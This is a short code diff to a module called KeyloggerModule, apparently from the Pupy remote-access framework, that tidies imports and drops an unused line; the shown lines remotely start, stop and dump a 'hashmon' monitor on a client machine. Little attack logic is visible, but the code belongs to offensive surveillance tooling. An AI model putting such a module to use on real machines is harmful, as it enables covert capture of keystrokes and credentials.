@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
-from pupylib.PupyModule import *
-from pupylib.utils.rpyc_utils import obtain
+
+from pupylib.PupyModule import config, PupyModule, PupyArgumentParser
 
 __class_name__='KeyloggerModule'
 
@@ -34,7 +34,6 @@ class KeyloggerModule(PupyModule):
         stop = self.client.remote('hashmon', 'stop', False)
         dump = self.client.remote('hashmon', 'dump')
 
-        hashmon = self.client.conn.modules.hashmon
         if args.action == 'start':
             start(
                 [ x.strip() for x in args.filter.split(',') ],
